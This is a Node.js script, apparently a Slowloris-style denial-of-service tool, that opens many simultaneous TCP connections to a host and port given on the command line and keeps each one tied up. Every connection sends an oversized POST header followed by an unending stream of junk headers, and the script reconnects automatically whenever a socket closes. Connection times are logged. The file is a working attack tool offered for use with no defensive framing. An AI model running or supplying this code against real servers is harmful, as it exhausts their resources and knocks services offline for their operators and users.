const net = require('net');
const { PerformanceObserver, performance } = require('perf_hooks');
const uuidv4 = require('uuid/v4');
const { argv } = require('yargs');

// Handle a lot of simultaneous connections and hold them tight.
const DEFAULT_CONNECTIONS = 50;
const WAIT_TIME = 0;

const connections = [];

let lastMessageTime = null;
function onHang() {
  const connecting = connections.filter(connection => !!connection.socket.connecting);
  console.log(`Process hanged. Connections count : ${connections.length}. Connecting : ${connecting.length}`);
}
const timeout = setInterval(() => {
  if (!lastMessageTime) {
    lastMessageTime = Date.now();
  }
  if (lastMessageTime + 1000 * 2 < Date.now()) {
    onHang();
  }
  timeout.refresh();
}, 1000 * 2);
// timeout.unref();

performance.clearMarks();
const obs = new PerformanceObserver(items => {
  const timing = items.getEntries()[0];

  const connection = connections.find(connection => connection.uuid === timing.name);

  lastMessageTime = Date.now();
  console.log(`[${connection.uuid}|${connection.number + 1}/${connections.length}]\tTime : ${timing.duration} ms\tHeaders : ${connection.headersCount}`);
  performance.clearMarks(timing.name);
});
obs.observe({ entryTypes: ['measure'] });

net.Socket.prototype.writeAsync = function (data) {
  return new Promise(resolve => {
    this.write(data, resolve);
  });
};

class Connection {
  constructor(number, host, port, wait) {
    this.number = number;
    this.host = host;
    this.port = port;
    this.state = 'ready';
    this.socket = null;
    this.headersCount = 0;
    this.marked = false;
    this.wait = wait || WAIT_TIME;
  }

  go() {
    this.uuid = uuidv4();
    this.state = 'going';
    this.marked = false;
    this._initSocket();
  }

  end() {
    if (this.state === 'end' && !this.socket) {
      return;
    }
    // console.log(`Sent ${this.headersCount} headers`);
    this.socket.destroy();
    this.state = 'end';

    if (this.marked) {
      const endMark = this.uuid + '-end';
      performance.mark(endMark);
      performance.measure(this.uuid, this.uuid, endMark);
    } else {
      // console.error('FAILED');
    }

    this.socket = null;

    try {
      this.go();
    } catch (err) {
      console.error(err);
    }
  }

  _initSocket() {
    this.socket = net.connect(this.port, this.host, async () => {
      await this.socket.writeAsync(`
        POST  HTTP/1.1
        Host: ${this.host}
        Content-Length: 9999999
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: no-cache
      `.trim());

      performance.mark(this.uuid);
      this.marked = true;

      try {
        for (this.headersCount = 0; ; this.headersCount++) {
          await this.socket.writeAsync(`
            X-Shit-${this.headersCount}: IWillDragYouDown
          `.trim());
          if (this.wait) {
            await new Promise(resolve => setTimeout(resolve, this.wait));
          }
        }
      } catch (err) {
        this.end();
      }
    });
    this.socket.setNoDelay(true);

    this.socket.on('data', data => {
      // console.log(data.toString('utf8'));
      this.end();
    });
    this.socket.on('error', err => {
      // console.error(err);
      this.end();
    });
    this.socket.on('close', () => {
      // console.log('CLOSED');
      this.end();
    });
    this.socket.on('end', () => {
      this.end();
    });
  }
}

(async () => {

  const { host, port, count, wait } = argv;

  for (let i = 0; i < (count || DEFAULT_CONNECTIONS); i++) {
    const conn = new Connection(i, host, port, wait);
    connections.push(conn);
    conn.go();
  }

  console.log('Fired connections :', connections.length);

})()
  .catch(console.error.bind(console));
